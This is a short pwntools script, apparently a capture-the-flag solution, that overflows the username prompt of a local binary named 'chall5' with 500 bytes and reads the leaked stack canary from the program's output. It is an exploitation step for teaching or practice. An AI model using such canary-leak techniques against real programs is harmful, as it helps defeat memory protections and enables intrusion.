from pwn import *

#start process with binary chall5
proc = process('./chall5')

#receive lines from chall5 until ': ' is received, this is when the program prompts the user for a username
line = proc.recvuntil(b": ")

#build and send payload to print the constant canary
input_string = (b"\x31"*500)
proc.sendline(input_string)

#receive lines until the program prompts the user for a password (it will print the username and what follows in the stack)
line = proc.recvuntil(b": ")
print(b"line after You Entered: ", line)

#get and print the canary from the program output
canary = line[518:522]
print("bytes: ", canary)